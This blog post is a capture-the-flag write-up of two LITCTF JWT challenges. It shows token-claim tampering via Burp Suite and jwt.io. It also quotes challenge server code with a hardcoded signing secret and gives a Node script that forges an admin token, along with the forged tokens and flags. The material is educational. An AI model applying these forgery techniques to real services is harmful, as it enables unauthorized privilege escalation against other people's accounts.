---
layout: post
title:  "JWT"
description: Exploiting JSON Web Tokens
date:   2024-08-13
tags: ["Web Exploitation", "JSON", "Easy"]
category: [CTF,LITCTF]
---

# JWT-1
## Challenge Info
`I just made a website. Since cookies seem to be a thing of the old days, I updated my authentication! With these modern web technologies, I will never have to deal with sessions again. Come try it out at http://litctf.org:31781/.`

## Understanding what a JWT is

The link that I'm given for this challenge is `http://litctf.org:31781/`. Before even messing with it though, I googled "JWT" to get some further context.

I found [this](https://en.wikipedia.org/wiki/JSON_web_Token) Wikipedia page. The quick summary, however, is this:

```JSON Web Token is a proposed Internet standard for creating data with optional signature and/or optional encryption whose payloads holds JSON that asserts some number of claims. The tokens are signed either using a private secret or a public/private key.```

## Attempts

Next, I visited the link, where I was greeted with this:

![Default page for the site](/images/JWT-1/getflag.png)

Naturally, my first response was to hit the giant button that screams "GET FLAG". This obviously didn't provide anything (that'd be too easy, and that's no fun).

![unauthorized screen](/images/JWT-1/unauthorized.png)

Then, I want back to the "Log in" page, and decided to log in with the user `admin` and the password `admin`, since alot of bad sites will use these as the default. This didn't work though, and I started to just try a bunch of different combinations, but each returned the same result:

![login screen](/images/JWT-1/unauthorized.png)

## Getting there...

Finally realizing this challenge wouldn't be **THAT** easy, I opened up [Burp Suite](https://en.wikipedia.org/wiki/Burp_Suite) to try and map out the site (maybe there's a hidden directory!).

I couldn't find any hidden directories though, so I altered my approach, instead of trying to map out the site, I tried intercepting through Burpsuite.

![intercept on burpsuite](/images/JWT-1/intercept.png)

Mostly, it looked like a normal site, but one thing did catch my eye- a cookie with the value of `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMTIzIiwiYWRtaW4iOmZhbHNlfQ.0Pi%2FH9Rz7ylX%2FM1MwPS469hjUu3b9gV0%2Fl8EW6roQC0`:

![burpsuite screenshot](/images/JWT-1/burpsuite.png)

This immediately led me to think: "Can I manipulate this token to get admin?.." So, I went back to the "GET FLAG" screen, and decided to inspect element to take a look at the cookies:

![cookies](/images/JWT-1/cookies.png)

For awhile, I messed with the `value` field. I tried changing it to `admin`, `123`, etc. Eventually, the correlation struck me- the "value" is actually a JWT (JSON Web Token)

## Solution

One of the first results when googling "JWT" is a site called [jwt.io](https://jwt.io/). This site lets us decode and modify JWT tokens, so it's crucial to beating the challenge:

![jwt.io](/images/JWT-1/jwtio.png)

I decided to put the token I had into the "Encoded" field, and noticed that the information in the "PAYLOAD" field reflected the login credentials I had tried earlier.

![payloads](/images/JWT-1/jwtpayload.png)

From there, I tried modifying the "admin" value from `false` to `true`, and noticed that the encoded field automatically updated to reflect the changes.

![new token](/images/JWT-1/newjwt.png)

Then, I went back to Burpsuite intercept, and replaced the old  cookie token with the **NEW** token (which is the same token, but with we modified `admin: true`), which for me was. I hit "forward", and got the flag.

flag: `LITCTF{o0ps_forg0r_To_v3rify_1re4DV9}`

# JWT-2


## Challenge Info
`its like jwt-1 but this one is harder.
URL: http://litctf.org:31777/`

attached: [index.ts](https://drive.google.com/uc?export=downloads&id=18gNp6DphcZBI5UmGjKsXhCkZvF1aIB6F&name=index.ts)

![JWT-2](/images/JWT-2/challenge.png)


## Preface
While this *is* a separate challenge, its fundamentals are heavily derived from the [first](/posts/jwt1) JWT challenge, which I heavily recommend you read first.


## Trying the first solution
Since this is a continuation of the **first** JWT challenge, I figured I'd try the same solution. A quick recap on how I beat the first one:

1. Register an account on the given site
2. Use Burpsuite intercept to capture the JWT associated with our account
3. Use [jwt.io](https://jwt.io) to read the contents of our JWT
4. Modify `admin` so that it equals to `true`
5. Access the "GET FLAG" button with our **new** JWT and acquire flag

For this challenge, while I **was** able to capture the JWT token and modify it to have `admin` set to `true`, upon actually using it, I was greeted with this:

![unauthorized](/images/JWT-2/unauthorized.png)

## Inspecting the attached TypeScript file
By now, I realized this challenge wouldn't be as simple as the last one, so I decided to skim through the attached TypeScript file, which I'll leave down below:

```ts
import express from "express";
import cookieParser from "cookie-parser";
import path from "path";
import fs from "fs";
import crypto from "crypto";

const accounts: [string, string][] = [];

const jwtSecret = "xook";
const jwtHeader = Buffer.from(
  JSON.stringify({ alg: "HS256", typ: "JWT" }),
  "utf-8"
)
  .toString("base64")
  .replace(/=/g, "");

const sign = (payloads: object) => {
  const jwtPayloads = Buffer.from(JSON.stringify(payloads), "utf-8")
    .toString("base64")
    .replace(/=/g, "");
    const signature = crypto.createHmac('sha256', jwtSecret).update(jwtHeader + '.' + jwtPayloads).digest('base64').replace(/=/g, '');
  return jwtHeader + "." + jwtPayloads + "." + signature;

}

const app = express();

const port = process.env.PORT || 3000;

app.listen(port, () =>
  console.log("server up on http://localhost:" + port.toString())
);

app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));

app.use(express.static(path.join(__dirname, "site")));

app.get("/flag", (req, res) => {
  if (!req.cookies.token) {
    console.log('no auth')
    return res.status(403).send("Unauthorized");
  }

  try {
    const token = req.cookies.token;
    // split up token
    const [header, payloads, signature] = token.split(".");
    if (!header || !payloads || !signature) {
      return res.status(403).send("Unauthorized");
    }
    Buffer.from(header, "base64").toString();
    // decode payloads
    const decodedPayloads = Buffer.from(payloads, "base64").toString();
    // parse payloads
```
Just to highlight what this code does:

`const [header, payloads, signature] = token.split(".");`
- splits the JWT token into its three parts; header, payloads, and signature, and the `.` acts as a delimiter.

`if (!req.cookies.token)`
- checks if the token is missing, and responds with `403 Unauthorized` if it is.

`Buffer.from(header,"base64").toString()` `Buffer.from(payloads,"base64").toString()`
- The header and payloads are decoded from base64 to their original string format.


However, what's really making us hit our head is the following:
```js
const sign = (payloads: object) => {
  const jwtPayloads = Buffer.from(JSON.stringify(payloads), "utf-8")
    .toString("base64")
    .replace(/=/g, "");
    const signature = crypto.createHmac('sha256', jwtSecret).update(jwtHeader + '.' + jwtPayloads).digest('base64').replace(/=/g, '');
  return jwtHeader + "." + jwtPayloads + "." + signature;
```

This removes the `=` characters from both the base64-encoded payloads and signature. This is normal in JWTs though, and doesn't affect the token's validity. The main issue here isn't the removal of padding, but making sure that the token **we** craft adheres to this format.

## Solution

The payloads that I came up with:

```js

const crypto = require('crypto');

const jwtSecret = "xook";
const jwtHeader = Buffer.from(
  JSON.stringify({ alg: "HS256", typ: "JWT" }),
  "utf-8"
)
  .toString("base64")
  .replace(/=/g, "");

const sign = (payloads) => {
  const jwtPayloads = Buffer.from(JSON.stringify(payloads), "utf-8")
    .toString("base64")
    .replace(/=/g, "");
  const signature = crypto
    .createHmac("sha256", jwtSecret)
    .update(jwtHeader + "." + jwtPayloads)
    .digest("base64")
    .replace(/=/g, "");
  return jwtHeader + "." + jwtPayloads + "." + signature;
};

const payloads = { name: "your_username", admin: true };
const forgedToken = sign(payloads);
console.log(forgedToken); // This is the token you will use.
```

This payloads creates a token using the `xook` secret, modifies `admin` to `true`, and removes all padding (`=` characters).

Then, I replaced the old token in Burpsuite intercept with the new one: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoieW91cl91c2VybmFtZSIsImFkbWluIjp0cnVlfQ.xwxnk5ogziOC8xlMNuolHBuQDbefnLA9rATCeS7fS+s`, and hit "forward".

![flag](/images/JWT-2/flag.png)

flag: `LITCTF{v3rifyed_thI3_Tlme_1re4DV9}`
